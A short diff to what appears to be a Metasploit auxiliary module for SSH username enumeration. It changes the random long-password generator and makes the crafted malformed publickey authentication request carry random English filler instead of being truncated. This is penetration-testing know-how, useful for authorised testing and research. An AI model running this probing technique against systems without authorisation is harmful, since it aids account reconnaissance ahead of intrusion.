@@ -162,7 +162,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def rand_pass
-    Rex::Text.rand_text_alphanumeric(64_000..65_000)
+    Rex::Text.rand_text_english(64_000..65_000)
   end
 
   def do_report(ip, user, port)
@@ -263,11 +263,14 @@ end
 #
 # XXX: This is ghetto af (see lib/msf/core/exploit/fortinet.rb)
 #
+# https://tools.ietf.org/rfc/rfc4252.txt
+# https://tools.ietf.org/rfc/rfc4253.txt
+#
 class Net::SSH::Authentication::Methods::MalformedPacket < Net::SSH::Authentication::Methods::Abstract
   def authenticate(service_name, username, password = nil)
     debug { 'Sending SSH_MSG_USERAUTH_REQUEST (publickey)' }
 
-    # Truncate everything after auth method
+    # Corrupt everything after auth method
     send_message(userauth_request(
 =begin
       string    user name in ISO-10646 UTF-8 encoding [RFC3629]
@@ -279,7 +282,8 @@ class Net::SSH::Authentication::Methods::MalformedPacket < Net::SSH::Authenticat
 =end
       username,
       service_name,
-      'publickey'
+      'publickey',
+      Rex::Text.rand_text_english(8..42)
     ))
 
     # SSH_MSG_DISCONNECT is queued
